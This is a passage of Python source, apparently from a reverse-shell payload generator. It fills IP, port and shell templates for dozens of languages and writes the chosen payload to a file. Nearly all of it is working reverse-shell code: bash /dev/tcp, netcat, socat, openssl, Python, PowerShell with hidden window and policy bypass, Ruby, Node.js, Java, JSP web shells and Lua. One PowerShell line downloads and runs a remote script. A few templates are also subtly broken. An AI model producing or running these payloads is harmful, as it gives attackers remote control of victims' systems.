#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = #PORTA#;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("#IP#");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"#SHELL#", NULL};
    execvp("#SHELL#", argv);

    return 0;       
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)


	if executavel == 'dart':
		extensao = 'dart'
		payloadr = """import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("#IP#", #PORTA#).then((socket) {
    socket.listen((data) {
      Process.start('#SHELL#', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'awk':
		extensao = 'sh'
		payloadr = """awk 'BEGIN {s = "/inet/tcp/0/#IP#/#PORTA#"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'vlang':
		extensao = 'sh'
		payload = f"""echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e {shell} {IP} {PORTA} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v """
	if executavel == 'golang':
		extensao = 'sh'
		payload = f"""echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORTA}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
	if executavel == 'zsh':
		extensao = 'zsh'
		payload = f"zmodload zsh/net/tcp && ztcp {IP} {PORTA} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"	
	if executavel == 'telnet':
		extensao = 'sh'
		payload = f"TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORTA} 0<$TF | {shell} 1>$TF"	
	if executavel == 'wconpty':
		extensao = 'ps1'
		payload = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORTA}"
	if executavel == 'curl':
		extensao = 'sh'
		payload = f"curl -Ns telnet://{IP}:{PORTA}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null"
	if executavel == 'rustcat':
		extensao = 'sh'
		payload = f"rcat connect -s {shell} {IP} {PORTA}"
	if executavel == 'openssl':
		extensao = 'sh'
		payload = f"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORTA} > /tmp/s; rm /tmp/s"
	if executavel == 'groovy':
		extensao = 'gvy'
		payloadr= 'String host="#IP#";int port=#PORTA#;String cmd="#SHELL#";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'haskell':
		extensao = 'hs'
		payloadr = """module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | #SHELL# -i 2>&1 | nc #IP# #PORTA# >/tmp/f"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'netcat1':
		extensao = 'sh'
		payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {IP} {PORTA} >/tmp/f"
	if executavel == 'netcat2':
		extensao = 'sh'
		payload = f"nc {IP} {PORTA} -e {shell}"
	if executavel == 'netcat3':
		extensao = 'bat'
		payload = f"nc.exe {IP} {PORTA} -e {shell}"
	if executavel == 'netcat4':
		extensao = 'sh'
		payload = f"busybox nc {IP} {PORTA} -e {shell}"
	if executavel == 'netcat5':
		extensao = 'sh'
		payload = f"nc -c {shell} {IP} {PORTA}"
	if executavel == 'netcat6':
		extensao = 'sh'
		payload = f"ncat {IP} {PORTA} -e {shell}"
	if executavel == 'netcat7':
		extensao = 'bat'
		payload = f"ncat.exe {IP} {PORTA} -e {shell}"
	if executavel == 'netcat8':
		extensao = 'sh'
		payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {IP} {PORTA} >/tmp/f"
				
		
	if executavel == 'bash1':
		extensao = 'sh'
		payload = f"{shell} -i >& /dev/tcp/{IP}/{PORTA} 0>&1"	
	if executavel == 'bash2':
		extensao = 'sh'
		payload = f"0<&196;exec 196<>/dev/tcp/{IP}/{PORTA}; {shell} <&196 >&196 2>&196"
	if executavel == 'bash3':
		extensao = 'sh'
		payload = f"exec 5<>/dev/tcp/{IP}/{PORTA};cat <&5 | while read line; do $line 2>&5 >&5; done"
	if executavel == 'bash4':
		extensao = 'sh'
		payload = f"{shell} -i 5<> /dev/tcp/{IP}/{PORTA} 0<&5 1>&5 2>&5"
	if executavel == 'bash5':
		extensao = 'sh'
		payload = f"{shell}  -i >& /dev/udp/{IP}/{PORTA} 0>&1"

	if executavel == 'python1':
		extensao = 'py'
		payload = f'''import sys,socket,os,pty
s=socket.socket()
s.connect(("{IP}", {PORTA}))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("{shell}")'''
	if executavel == 'python2':
		extensao = 'py'
		payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IP}", {PORTA}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("{shell}")'''
	if executavel == 'python3':
		extensao = 'py'
		payload = f'''import sys,socket,os,pty
s=socket.socket()
s.connect(("{IP}", {PORTA}))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("{shell}")'''
	if executavel == 'python4':
		extensao = 'py'
		payload = f'''socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IP}", {PORTA}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("{shell}")'''
	if executavel == 'python5':
		extensao = 'py'
		payload = f'''import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IP}", {PORTA}))
p=subprocess.Popen(["{shell}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
try:
	p.wait()
except KeyboardInterrupt:
	s.close()'''
	if executavel == 'powershell4':
		extensao = 'ps1'
		payloadr = """$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('#IP#', #PORTA#);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'powershell3':
		extensao = 'ps1'
		payloadr = """powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('#IP#', #PORTA#);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'powershell2':
		extensao = 'ps1'
		payloadr = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('#IP#',#PORTA#);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'powershell1':
		extensao = 'ps1'
		payloadr = """$LHOST = "#IP#"; $LPORT = #PORTA#; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'ruby1':
		extensao = 'sh'
		payloadr = """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("#IP#",#PORTA#))'"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'ruby2':
		extensao = 'sh'
		payloadr = """ruby -rsocket -e'exit if fork;c=TCPSocket.new("#IP#","#PORTA#");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'socat1':
		extensao = 'sh'
		payloadr = """socat TCP:#IP#:#PORTA# EXEC:#SHELL#"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'socat2':
		extensao = 'sh'
		payloadr = """socat TCP:#IP#:#PORTA# EXEC:'#SHELL#',pty,stderr,setsid,sigint,sane"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'sqliter3':
		extensao = 'sh'
		payloadr = """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|#SHELL# -i 2>&1|nc #IP# #PORTA# >/tmp/f'"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'nodejs1':
		extensao = 'js'
		payloadr = """require('child_process').exec('nc -e #SHELL# #IP# #PORTA#')"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'nodejs2':
		extensao = 'js'
		payloadr = """
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("#SHELL#", []);
    var client = new net.Socket();
    client.connect(#PORTA#, "#IP#", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'javardao1':
		extensao = 'jar'
		payloadr = """public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/#IP#/#PORTA# 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'javardao2':
		extensao = 'jar'
		payloadr = """public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/#IP#/#PORTA# 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'javardao3':
		extensao = 'jar'
		payloadr = """import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "#IP#";
        int port = #PORTA#;
        String cmd = "#SHELL#";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'javardao4':
		extensao = 'jar'
		payloadr = """<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'javardao5':
		extensao = 'java'
		payloadr = """<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( "#IP#", #PORTA# ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}
%>
</pre>
</body>
</html>"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'javardao6':
		extensao = 'js'
		payloadr = """String command = "var host = '#IP#';" +
                       "var port = #PORTA#;" +
                       "var cmd = '#SHELL#';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'lua1':
		extensao = 'lua'
		payloadr = """require('socket');require('os');t=socket.tcp();t:connect('#IP#','#PORTA#');os.execute('#SHELL# -i <&3 >&3 2>&3')"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'lua2':
		extensao = 'lua'
		payloadr = """local host, port = "#IP#", #PORTA# local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	#salva
	w = open(f'{nome_arquivo}.{extensao}', 'w')
	w.write(payload)
	w.close()
	return f'{nome_arquivo}.{extensao}'
